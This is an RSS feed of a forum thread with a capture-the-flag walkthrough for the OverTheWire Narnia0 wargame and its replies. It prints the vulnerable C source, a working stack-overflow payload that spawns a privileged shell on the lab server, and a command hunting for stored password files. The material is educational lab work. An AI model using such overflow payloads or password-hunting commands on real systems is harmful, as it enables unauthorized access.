<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Over The Wire - Narnia0 - basic buffer overflow</title>
    <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663</link>
    <description>## OverTheWire: Narnia0 - Basic Exploitation
OverTheWire.org is a website which hosts sever servers for learning linux/hacking/exploitation/crypto/web apps etc. etc... Narnia is there basic exploitation/intro to buffer overflow server.

Before continuing this, the reader is encouraged to/expected to have

* gone through all the levels on **Bandit**.
* have a basic understanding of C/C++
* have a basic understanding of *nix commands
* have a basic understanding of memory, the stack, and x86 assembly
* have a basic understanding of python to speed up exploitation

To start, you just need to **ssh** into the OverTheWire server. If this is your first time using **ssh** I strongly encourage you to ssh into bandit.
&gt; 123loaded@redhat: ssh bandit0@bandit.labs.overthewire.org

The [OTW](http://overthewire.org) website lists all the commands necessary to solve each level. Just type &quot;man command&quot; to view the manual pages of any command, and progress accordingly.

Ok, so now go ahead and ssh into host narnia.labs.overthewire.org as user narnia0. The password to level 0 on each server is just the username of that server. So ssh narnia0@narnia.labs.overthewire.org, password narnia0. Once in, you&#39;ll notice when you &#39;ls&#39; to see what&#39;s in your home directory that nothing is there. The narnia servers are a little misconfigured since they moved the entire thing over from intruded.net and don&#39;t dump you into your own narnia# directory with the challenge in it like most servers do. A little digging around on the server and we find that all narnia challenges are stored in /games/narnia/. Go ahead and change directory into there and try to run narnia0.

&gt;narnia0@melinda:/games/narnia$ ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: deadbeef
buf: deadbeef
val: 0x41414141
WAY OFF!!!!
narnia0@melinda:/games/narnia$ 
 
Hmmmm, let&#39;s check out the source code of narnia0.c which they so kindly provide to us.
&gt;narnia0@melinda:/games/narnia$ cat narnia0.c
int main(){
    long val=0x41414141;
    char buf[20];
&gt;
    printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);
    printf(&quot;Here is your chance: &quot;);
    scanf(&quot;%24s&quot;,&amp;buf);
&gt;
    printf(&quot;buf: %s\n&quot;,buf);
    printf(&quot;val: 0x%08x\n&quot;,val);
&gt;
    if(val==0xdeadbeef)
        system(&quot;/bin/sh&quot;);
    else {
        printf(&quot;WAY OFF!!!!\n&quot;);
        exit(1);
    }
&gt;
    return 0;
}


Ok, so in x86, as code is run, arguments are pushed onto and popped off of [The Stack](https://en.wikipedia.org/wiki/Call_stack). The stack has a FILO(First In Last Out) implementation. I guess all of that is a little irrelevant right now for this level, but you&#39;ll need to know everything about how the stack works in the next level or two of narnia, so I&#39;ll link that info if I end up writing more about it. For now, just know that, as soon as main() is executed, any arguments that are passed to main will be pushed onto the stack, and then any variables of fixed length that are declared in said function will be pushed onto the stack. And while the stack grows &quot;up&quot; towards Lower memory addresses, data is written down towards higher memory addresses. So, **val** gets pushed onto the stack, and then **char buf[20]**.
If we put more than 20 characters of data into **buf[]** it will overflow the bounds of **buf[]** and effectively **_smash the stack_** and overwrite memory **_below_** **buf[]**, which we know from our knowledge of how the stack gets laid out, to be **val**. Let&#39;s test this. 
&gt;narnia0@melinda:/games/narnia$ ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: BBBBBBBBBBBBBBBBBBBBBBBB
buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!

Ah ha! **val** is now &quot;0x42424242&quot; which is &quot;BBBB&quot; in printable ASCII. Conveniently, this code is written to scan in 24 bytes of data and try to insert them into **buf[]**, which is only a 20 character buffer. So, we simply need to input 20 characters, or bytes, of data, and then smash **val** with **0xDEADBEEF**. Easy right?

But wait 123loaded, DEADBEEF is 8 characters, how we gunna pull that one off? Remember, &quot;0x&quot; is the start of hex characters, and one Byte of data is 2 hex characters (ranging from 0-F). We need a program to print hex values, because they are not printable characters. Enter python.

&gt;narnia0@melinda:/games/narnia$ python -c &#39;print &quot;B&quot;*20 + &quot;\xEF\xBE\xAD\xDE&quot;&#39;
BBBBBBBBBBBBBBBBBBBBﾭ� 

Cool! So now we just copy/paste that onto the terminal and we&#39;re good right??
&gt;narnia0@melinda:/games/narnia$ ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: BBBBBBBBBBBBBBBBBBBBﾭ�
buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xefadbeef
WAY OFF!!!!

Wat.
After a couple hours of fucking around on the most basic of narnia levels and questioning your existence and the meaning of life, you realize that something goes awry when you try and copy/paste non-printable characters. Matter of fact, I&#39;m pretty sure things also go wrong if you use input redirection to send the output of python to a file and then cat out that file and pipe it straight to narnia0. Turns out the only clean way is to pipe the output straight from our python command into narnia0, and it _finally_ is correct.

&gt;narnia0@melinda:/games/narnia$ python -c &#39;print &quot;B&quot;*20 + &quot;\xEF\xBE\xAD\xDE&quot;&#39; | ./narnia0 
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
narnia0@melinda:

Errrrr, wat.
I don&#39;t even.
Back to the drawing board. We&#39;ve overwritten **val** with the value it wants... so logically, what is happening now? Well, it turns out, i̶f̶ ̶a̶ ̶p̶a̶r̶e̶n̶t̶ ̶p̶r̶o̶c̶e̶s̶s̶ ̶s̶p̶a̶w̶n̶s̶ ̶a̶ ̶c̶h̶i̶l̶d̶ p̶r̶o̶c̶e̶s̶s̶,̶ ̶t̶h̶e̶ ̶p̶a̶r̶e̶n̶t̶ ̶k̶i̶l̶l̶s̶ ̶a̶l̶l̶ ̶i̶t̶s̶ ̶c̶h̶i̶l̶d̶r̶e̶n̶ ̶u̶p̶o̶n̶ ̶t̶e̶r̶m̶i̶n̶a̶t̶i̶o̶n̶.̶.̶.̶ 
̶f̶u̶c̶k̶i̶n̶g̶ ̶h̶o̶r̶r̶i̶b̶l̶e̶ ̶p̶a̶r̶e̶n̶t̶ ̶n̶a̶r̶n̶i̶a̶0̶ ̶i̶s̶  the pipe sends an EOF (end of file) flag when it closes once the python command is finished executing which makes the system call return immediately, as it assumed the input is done. So, we need to keep narnia0 open so that our shell can pop and we can actually do things in the shell. After hours of fucking around with bash subscripting while trying to land a correct &quot;whoami&quot; from /bin/sh, this happens.
&gt;narnia0@melinda:/games/narnia$ (python -c &#39;print &quot;B&quot;*20 + &quot;\xEF\xBE\xAD\xDE&quot;&#39;;whoami) | ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
/bin/sh: 1: narnia0: not found

The command &quot;**whoami**&quot; still ran under narnia0 permissions, but our shell ran for a moment!! That&#39;s the correct syntax to pass a command after our first one (just a semi colon in bash, followed by a legal second command). Now, with a little bash fu, and our knowledge learned from **bandit** we remember that executing &quot;**cat -**&quot; will attempt to cat **stdIN**... which means it will wait for input from the terminal, and not immediately end the command like &quot;**cat /some/file**&quot; or &quot;**whoami**&quot; would/did. And alas, we pop a shell. Harder, yet faster, than your mom&#39;s cherry last night, you fucking time traveler.

&gt;narnia0@melinda:/games/narnia$ (python -c &#39;print &quot;B&quot;*20 + &quot;\xEF\xBE\xAD\xDE&quot;&#39;;cat -) | ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
ls
narnia0    narnia1.c  narnia3     narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4     narnia5.c  narnia7    narnia8.c
whoami
narnia1

Now with some digging around, find where the password to narnia1 is stored and cat it out. FuckYeah.jpg</description>
    
    <lastBuildDate>Sat, 29 Apr 2017 00:47:56 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/11</link>
        <pubDate>Sun, 21 Jan 2018 00:42:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-11</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[nopSled]]></dc:creator>
        <description><![CDATA[
            <p>Just playing around a bit today and figured out a different/tad bit cleaner way to cat that file</p>
<p>After we write to the tmp folder…<br>
python -c ‘print “A” * 20 + “\xEF\xBE\xAD\xDE”’ &gt; /tmp/filename.txt</p>
<p>cat to verify it wrote…<br>
cat /tmp/filename.txt<br>
AAAAAAAAAAAAAAAAAAAAﾭ</p>
<p>Then to pipe it…<br>
example: cat /tmp/filename.txt - | ./narnia0</p>
<p>This is a little bit better because cat is doing the file, then waiting for input from standard in…<br>
which is what - means for bash,<br>
or at least…<br>
what it means for cat</p>
<p>no parenthesis necessary <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/10</link>
        <pubDate>Sat, 29 Apr 2017 00:07:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-10</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <p>I believe they have an “/etc/passwds/” directory, to which there’s a narnia folder. Or it’s “/etc/narnia_pass/” which has all the narnia passwords. It’s just chillin somewhere obvious in /etc/ I know that.<br>
When I said “somg digging” though, I think I usually do something really ghetto (and not syntactically correct ever) such as “find / | grep narnia | grep pass”.</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/9</link>
        <pubDate>Mon, 05 Sep 2016 07:42:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-9</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Quick question, when you put "Now with some digging around, find where the password to narnia1 is stored and cat it out. ", where is this file? Any more explanation?</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/8</link>
        <pubDate>Fri, 22 Jul 2016 21:36:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-8</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>The copying and pasting mostly depends on your terminal. Whenever you “print” a non-printable character your terminal may produce something distinguishable, a special character for non-printable characters, or just nothing… . In the last two cases, you are just loosing information.</p>
<p>Regarding the other option (dump to a file and pipe it), I have just tried and I do not fully understand what do you mean. In may system the program behaves the same…</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/7</link>
        <pubDate>Sat, 02 Jul 2016 08:09:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-7</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Make an ASM and Stack tutorial if you’re concerned about newbies. You could make it a pre-cursor to these and link them.</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/6</link>
        <pubDate>Sat, 02 Jul 2016 06:09:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-6</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <p>Should I keep them this low level? Like, I’m writing up the tutorial for <a href="http://overthewire.org/wargames/narnia/narnia2.html" rel="nofollow noopener">narnia2</a> right now, but it is a full blown smash-the-stack-and-overwrite-$EIP-return-to-shellcode challenge, and it requires relatively in-depth knowledge of <strong>the stack</strong>, <strong>x86 assembly</strong>, and <strong>gdb</strong> for reverse-engineering a binary in linux. And like, on one hand I wanna keep it Suuuuuuper low level cause I remember when I didn’t know Any of that, and reading a tutorial that stopped to explain things I didn’t understand was just amazing… but at the same time, explaining x86 assembly and gdb is two seperate tutorials in and of itself lmao… and another part of me wants to just go high levelAF cause I also know there’s some people here that won’t read the whole thing cause it’s just taking too long and going over, and way too into, things they already know how to do lol… and then there’s <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> who’s obligated, out of kindness and his motherly love for the website, to read each post, and I’d be making him read a <em>novel</em> lmao… and I can’t just bring myself to make gdb/x86 assembly tutorials on their own cause I feel that’s lacking a sense of direction lolololol. Whatevs… GG_YOLOsauceInAndAroundMyMouth.jpg</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/5</link>
        <pubDate>Sat, 02 Jul 2016 04:05:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-5</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <p>Ahhh, that makes a bit more sense. I was kind of taking my best guess, and that was my hypothesis which my hack of a solution seemed to support, and confirmation bias + arrogance in assuming I’m always right + being a lazy fuck led to me never looking it up lolololololol.<br>
Can you explain why it wouldn’t work copy/pasting the input or even doing <strong>echo $(python -c ‘print “myEscapedHexStringHere”’ )&gt; file.txt</strong> and then <strong>cat file.txt | ./narnia0</strong>?? The problem at this point wasn’t/isn’t the pipe EOF (though this problem should still occur with this method since we’re still piping something into the narnia0 binary). The problem seems to be that it saves the <em>last</em> two bytes or so backwards…? or like… I don’t even know. Would be curious to hear your thoughts on that one.</p>
<p>PS - Thx for taking the time to skim over (or thoroughly read sometimes I see) every article posted on here man! Feels good to know at least One person is going to read my thoughts and encourage me to do more, LOL! Srsly tho &lt;3. You too <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> hahaha don’t think I didn’t see you down there!</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/4</link>
        <pubDate>Sat, 02 Jul 2016 02:48:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-4</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Epic Article <a class="mention" href="https://0x00sec.org/u/123loaded">@123loaded</a>! I am a big fan of these low level tutorials, this is exactly what I like to see <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> Good job!</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/3</link>
        <pubDate>Mon, 27 Jun 2016 08:00:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-3</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group quote-modified" data-username="123loaded" data-post="1" data-topic="663">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/123loaded/40/578_2.png" class="avatar"> 123loaded:</div>
<blockquote>
<p>Well, it turns out, if a parent process spawns a child process, the parent kills all its children upon termination… fucking horrible parent narnia0 is. So, we need to keep narnia0 open so that our shell can pop and we can actually do things in the shell</p>
</blockquote>
</aside>
<p>That sentence is not fully correct and it is not the reason for the problem you described in the post. What is happening is that, once the python script finish, the pipe is closed and an EOF is sent. That EOF makes the <code>system</code> call returns immediately, as it assumes that the input is done.</p>
<p>Your technique is indeed a way to avoid the issue of the EOF and solve the level.</p>
<p>Good post!</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/2</link>
        <pubDate>Sun, 26 Jun 2016 15:45:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-2</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
      <item>
        <title>Over The Wire - Narnia0 - basic buffer overflow</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <h2>OverTheWire: Narnia0 - Basic Exploitation</h2>
<p><a href="http://OverTheWire.org" rel="nofollow noopener">OverTheWire.org</a> is a website which hosts sever servers for learning linux/hacking/exploitation/crypto/web apps etc. etc… Narnia is there basic exploitation/intro to buffer overflow server.</p>
<p>Before continuing this, the reader is encouraged to/expected to have</p>
<ul>
<li>gone through all the levels on <strong>Bandit</strong>.</li>
<li>have a basic understanding of C/C++</li>
<li>have a basic understanding of *nix commands</li>
<li>have a basic understanding of memory, the stack, and x86 assembly</li>
<li>have a basic understanding of python to speed up exploitation</li>
</ul>
<p>To start, you just need to <strong>ssh</strong> into the OverTheWire server. If this is your first time using <strong>ssh</strong> I strongly encourage you to ssh into bandit.</p>
<blockquote>
<p>123loaded@redhat: ssh <a href="mailto:bandit0@bandit.labs.overthewire.org">bandit0@bandit.labs.overthewire.org</a></p>
</blockquote>
<p>The <a href="http://overthewire.org" rel="nofollow noopener">OTW</a> website lists all the commands necessary to solve each level. Just type “man command” to view the manual pages of any command, and progress accordingly.</p>
<p>Ok, so now go ahead and ssh into host <a href="http://narnia.labs.overthewire.org" rel="nofollow noopener">narnia.labs.overthewire.org</a> as user narnia0. The password to level 0 on each server is just the username of that server. So ssh <a href="mailto:narnia0@narnia.labs.overthewire.org">narnia0@narnia.labs.overthewire.org</a>, password narnia0. Once in, you’ll notice when you ‘ls’ to see what’s in your home directory that nothing is there. The narnia servers are a little misconfigured since they moved the entire thing over from <a href="http://intruded.net" rel="nofollow noopener">intruded.net</a> and don’t dump you into your own narnia# directory with the challenge in it like most servers do. A little digging around on the server and we find that all narnia challenges are stored in /games/narnia/. Go ahead and change directory into there and try to run narnia0.</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ ./narnia0<br>
Correct val’s value from 0x41414141 -&gt; 0xdeadbeef!<br>
Here is your chance: deadbeef<br>
buf: deadbeef<br>
val: 0x41414141<br>
WAY OFF!!!<br>
narnia0@melinda:/games/narnia$</p>
</blockquote>
<p>Hmmmm, let’s check out the source code of narnia0.c which they so kindly provide to us.</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ cat narnia0.c<br>
int main(){<br>
long val=0x41414141;<br>
char buf[20];</p>
</blockquote>
<pre><code>printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n");
printf("Here is your chance: ");
scanf("%24s",&amp;buf);
</code></pre>
<blockquote></blockquote>
<pre><code>printf("buf: %s\n",buf);
printf("val: 0x%08x\n",val);
</code></pre>
<blockquote></blockquote>
<pre><code>if(val==0xdeadbeef)
    system("/bin/sh");
else {
    printf("WAY OFF!!!!\n");
    exit(1);
}
</code></pre>
<blockquote></blockquote>
<pre><code>return 0;
</code></pre>
<p>}</p>
<p>Ok, so in x86, as code is run, arguments are pushed onto and popped off of <a href="https://en.wikipedia.org/wiki/Call_stack" rel="nofollow noopener">The Stack</a>. The stack has a FILO(First In Last Out) implementation. I guess all of that is a little irrelevant right now for this level, but you’ll need to know everything about how the stack works in the next level or two of narnia, so I’ll link that info if I end up writing more about it. For now, just know that, as soon as main() is executed, any arguments that are passed to main will be pushed onto the stack, and then any variables of fixed length that are declared in said function will be pushed onto the stack. And while the stack grows “up” towards Lower memory addresses, data is written down towards higher memory addresses. So, <strong>val</strong> gets pushed onto the stack, and then <strong>char buf[20]</strong>.<br>
If we put more than 20 characters of data into <strong>buf[]</strong> it will overflow the bounds of <strong>buf[]</strong> and effectively <strong><em>smash the stack</em></strong> and overwrite memory <strong><em>below</em></strong> <strong>buf[]</strong>, which we know from our knowledge of how the stack gets laid out, to be <strong>val</strong>. Let’s test this.</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ ./narnia0<br>
Correct val’s value from 0x41414141 -&gt; 0xdeadbeef!<br>
Here is your chance: BBBBBBBBBBBBBBBBBBBBBBBB<br>
buf: BBBBBBBBBBBBBBBBBBBBBBBB<br>
val: 0x42424242<br>
WAY OFF!!!</p>
</blockquote>
<p>Ah ha! <strong>val</strong> is now “0x42424242” which is “BBBB” in printable ASCII. Conveniently, this code is written to scan in 24 bytes of data and try to insert them into <strong>buf[]</strong>, which is only a 20 character buffer. So, we simply need to input 20 characters, or bytes, of data, and then smash <strong>val</strong> with <strong>0xDEADBEEF</strong>. Easy right?</p>
<p>But wait 123loaded, DEADBEEF is 8 characters, how we gunna pull that one off? Remember, “0x” is the start of hex characters, and one Byte of data is 2 hex characters (ranging from 0-F). We need a program to print hex values, because they are not printable characters. Enter python.</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ python -c ‘print “B”*20 + “\xEF\xBE\xAD\xDE”’<br>
BBBBBBBBBBBBBBBBBBBBﾭ�</p>
</blockquote>
<p>Cool! So now we just copy/paste that onto the terminal and we’re good right??</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ ./narnia0<br>
Correct val’s value from 0x41414141 -&gt; 0xdeadbeef!<br>
Here is your chance: BBBBBBBBBBBBBBBBBBBBﾭ�<br>
buf: BBBBBBBBBBBBBBBBBBBBﾭ�<br>
val: 0xefadbeef<br>
WAY OFF!!!</p>
</blockquote>
<p>Wat.<br>
After a couple hours of fucking around on the most basic of narnia levels and questioning your existence and the meaning of life, you realize that something goes awry when you try and copy/paste non-printable characters. Matter of fact, I’m pretty sure things also go wrong if you use input redirection to send the output of python to a file and then cat out that file and pipe it straight to narnia0. Turns out the only clean way is to pipe the output straight from our python command into narnia0, and it <em>finally</em> is correct.</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ python -c ‘print “B”*20 + “\xEF\xBE\xAD\xDE”’ | ./narnia0<br>
Correct val’s value from 0x41414141 -&gt; 0xdeadbeef!<br>
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�<br>
val: 0xdeadbeef<br>
narnia0@melinda:</p>
</blockquote>
<p>Errrrr, wat.<br>
I don’t even.<br>
Back to the drawing board. We’ve overwritten <strong>val</strong> with the value it wants… so logically, what is happening now? Well, it turns out, i̶f̶ ̶a̶ ̶p̶a̶r̶e̶n̶t̶ ̶p̶r̶o̶c̶e̶s̶s̶ ̶s̶p̶a̶w̶n̶s̶ ̶a̶ ̶c̶h̶i̶l̶d̶ p̶r̶o̶c̶e̶s̶s̶,̶ ̶t̶h̶e̶ ̶p̶a̶r̶e̶n̶t̶ ̶k̶i̶l̶l̶s̶ ̶a̶l̶l̶ ̶i̶t̶s̶ ̶c̶h̶i̶l̶d̶r̶e̶n̶ ̶u̶p̶o̶n̶ ̶t̶e̶r̶m̶i̶n̶a̶t̶i̶o̶n̶.̶.̶.̶<br>
̶f̶u̶c̶k̶i̶n̶g̶ ̶h̶o̶r̶r̶i̶b̶l̶e̶ ̶p̶a̶r̶e̶n̶t̶ ̶n̶a̶r̶n̶i̶a̶0̶ ̶i̶s̶  the pipe sends an EOF (end of file) flag when it closes once the python command is finished executing which makes the system call return immediately, as it assumed the input is done. So, we need to keep narnia0 open so that our shell can pop and we can actually do things in the shell. After hours of fucking around with bash subscripting while trying to land a correct “whoami” from /bin/sh, this happens.</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ (python -c ‘print “B”*20 + “\xEF\xBE\xAD\xDE”’;whoami) | ./narnia0<br>
Correct val’s value from 0x41414141 -&gt; 0xdeadbeef!<br>
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�<br>
val: 0xdeadbeef<br>
/bin/sh: 1: narnia0: not found</p>
</blockquote>
<p>The command “<strong>whoami</strong>” still ran under narnia0 permissions, but our shell ran for a moment!! That’s the correct syntax to pass a command after our first one (just a semi colon in bash, followed by a legal second command). Now, with a little bash fu, and our knowledge learned from <strong>bandit</strong> we remember that executing “<strong>cat -</strong>” will attempt to cat <strong>stdIN</strong>… which means it will wait for input from the terminal, and not immediately end the command like “<strong>cat /some/file</strong>” or “<strong>whoami</strong>” would/did. And alas, we pop a shell. Harder, yet faster, than your mom’s cherry last night, you fucking time traveler.</p>
<blockquote>
<p>narnia0@melinda:/games/narnia$ (python -c ‘print “B”*20 + “\xEF\xBE\xAD\xDE”’;cat -) | ./narnia0<br>
Correct val’s value from 0x41414141 -&gt; 0xdeadbeef!<br>
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�<br>
val: 0xdeadbeef<br>
ls<br>
narnia0    narnia1.c  narnia3     narnia4.c  narnia6    narnia7.c<br>
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8<br>
narnia1    narnia2.c  narnia4     narnia5.c  narnia7    narnia8.c<br>
whoami<br>
narnia1</p>
</blockquote>
<p>Now with some digging around, find where the password to narnia1 is stored and cat it out. FuckYeah.jpg</p>
          <p><a href="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663/1</link>
        <pubDate>Sun, 26 Jun 2016 04:22:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-663-1</guid>
        <source url="https://0x00sec.org/t/over-the-wire-narnia0-basic-buffer-overflow/663.rss">Over The Wire - Narnia0 - basic buffer overflow</source>
      </item>
  </channel>
</rss>
